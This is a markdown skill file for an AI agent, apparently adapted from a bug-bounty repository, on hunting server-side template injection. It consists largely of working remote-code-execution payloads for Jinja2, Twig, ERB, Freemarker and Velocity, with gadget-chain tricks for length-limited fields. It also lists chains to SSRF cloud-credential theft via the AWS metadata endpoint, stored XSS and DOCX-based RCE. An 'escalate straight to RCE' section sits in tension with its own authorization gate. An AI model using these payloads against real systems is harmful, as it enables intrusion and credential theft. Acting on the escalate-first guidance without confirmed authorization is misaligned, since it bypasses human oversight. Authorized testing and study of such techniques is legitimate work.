---
name: hunt-ssti
description: Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django),
  Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf,
  Smarty.
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public, cve_database, public_research
report_count: 6
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## Autonomous Testing Priority

**Escalate straight to RCE — don't stop at arithmetic detection.**

Arithmetic probes (`{{7*7}}→49`) confirm the injection point but are not proof of impact. The real goal is OS command execution. Arithmetic detection also fails silently when the app echoes the input back (e.g. inside an HTML attribute like `<input value="{{7*7}}">`), producing a false negative even when injection exists.

**Order of attack:**
1. **Try Jinja2 RCE first** (covers Python/Flask — the most common stack in modern web apps):
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
2. **If the endpoint is a traditional web form**, send as form-encoded body — NOT JSON:
   ```
   Content-Type: application/x-www-form-urlencoded
   field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
   JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).
3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.

**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts — the format is irrelevant, the content is the evidence.

---

## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION
> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

### Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

### RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### Length-constrained injection fields (profile name, display name, subject)
When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won't fit — but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
```python
{{ '7'*7 }}                                  # detection, fits anywhere
{{ [].__class__.__base__.__subclasses__() }} # dump class list, pick the index for subprocess.Popen/os
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX] ('id',shell=True,stdout=-1).communicate() }}
```
The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page — read the email body for the evaluated output. Disclosed: reports/125980 (profile-name → Jinja2 → confirmation email, length-limited).

### Where to Test
```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```

### CMS / "documentation" template-editor forms (authenticated)

Some SSTI lives behind a logged-in template editor (CMS "edit template" / product-template / email-template
preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three things break a naive attempt:

1. **Fingerprint BEFORE firing RCE — the engine decides the syntax.** Do NOT assume Jinja2. Probe the
   whole matrix and read which one evaluates:
   ```
   ${7*7}  → 49  AND  #{7*7} → 49   ⇒ Freemarker (Java)   ← {{7*7}} does NOTHING here
   {{7*7}} → 49                      ⇒ Jinja2 / Twig
   <%= 7*7 %> → 49                   ⇒ ERB (Ruby)
   *{7*7}  → 49                      ⇒ Thymeleaf (Spring)
   ```
   If `{{7*7}}` renders literally but `${7*7}`→49, you are on **Freemarker** — stop sending `{{config...}}`.

2. **The record id is usually a QUERY param, not a body field.** The editor form posts back to
   `POST /…/template?productId=N` with the id in the URL. The BODY carries only
   `csrf`, `template`, and a `template-action` (`preview` | `save`). Putting the id in the body returns
   `400 "Missing product id"`. So keep the id in the query string (`?productId=N`) AND send a
   form-encoded body of `csrf=…&template=<PAYLOAD>&template-action=preview`.

3. **Re-fetch the CSRF each time and use `preview` to iterate.** GET the editor page to read a *fresh*
   `csrf` hidden field; `template-action=preview` renders your payload WITHOUT persisting (fast feedback
   loop). Switch to `template-action=save` only once the payload is right, then trigger the render
   (load the public page that uses the template) to fire the command.

   **Freemarker documentation RCE** (the documented `Execute` utility — this IS the intended technique):
   ```
   <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
   ```
   Velocity equivalent: `#set($e="e");$e.getClass().forName("java.lang.Runtime")...`.

---

## Related Skills & Chains

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
